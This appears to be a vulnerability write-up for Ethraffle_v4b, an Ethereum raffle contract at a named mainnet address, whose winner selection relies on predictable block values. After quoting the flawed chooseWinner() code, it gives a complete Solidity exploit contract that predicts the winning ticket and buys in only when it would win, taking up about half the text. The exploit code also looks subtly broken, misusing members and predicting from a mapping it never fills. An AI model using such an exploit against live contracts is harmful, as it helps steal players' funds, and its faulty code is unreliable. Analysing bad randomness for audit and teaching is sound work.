Ethraffle_v4b
======
https://etherscan.io/address/0xcC88937F325d1C6B97da0AFDbb4cA542EFA70870#code

Vulnerability type
------
Bad randomness

Abstract
------
A gambling smart contract implementation for Ethraffle_v4b, an Ethereum gambling game, sells tickets and after the last ticket in a round was sold randomly generates a winner from all the buyers who will claim the price, generates a random value that is predictable by attacker. The developer wrote a `chooseWinner()` function that uses block coinbase and difficulty as the seed. This can be predicted by writing the same random function code in an exploit contract to determine the `winningNumber` value.

Related code
------

    function buyTickets() payable public {
        ......
        // Choose winner if we sold all the tickets
        if (nextTicket == totalTickets) {
            chooseWinner();
        }
        ......
    }
    
    function chooseWinner() private {
        address seed1 = contestants[uint(block.coinbase) % totalTickets].addr;
        address seed2 = contestants[uint(msg.sender) % totalTickets].addr;
        uint seed3 = block.difficulty;
        bytes32 randHash = keccak256(seed1, seed2, seed3);

        uint winningNumber = uint(randHash) % totalTickets;
        address winningAddress = contestants[winningNumber].addr;
        
        ......
        
        winningAddress.transfer(prize);
    }

Details
------
After all tickets in a round(50 ticket for a round) was sold, `chooseWinner()` randomly generates a winner from all the buyers who will claim the price. However, `block.coinbase`, `block.difficulty` and the mapping `contestants` are all readable from etherchain, so the result can be determined in an attack contract.

Exploit
------
    contract Exploit{
    
        Ethraffle_v4b target;
        
        struct Contestant {
            address addr;
            uint raffleId;
        }
        //The data of this mapping can be accessed from the chain.
        mapping (uint => Contestant) contestants;
        
        uint constant totalTickets = 50;
        
        function Exploit(address _target) public payable{
            target = Ethraffle_v4b(_target);
        }
    
        function attack(uint256 _amount) public payable{
        
            uint current_sold = target.nextTicket;
            if(current_sold + 1 == totalTickets){
                address seed1 = contestants[uint(block.coinbase) % totalTickets].addr;
                address seed2 = contestants[uint(this.address) % totalTickets].addr;
                uint seed3 = block.difficulty;
                bytes32 randHash = keccak256(seed1, seed2, seed3);
                uint winningNumber = uint(randHash) % totalTickets;
                
                if(winningNumber + 1 == totalTickets){
                    target.buyTickets.value(_amount)();
                    msg.sender.transfer(this.balance);
                }

            }
            
        }
    }
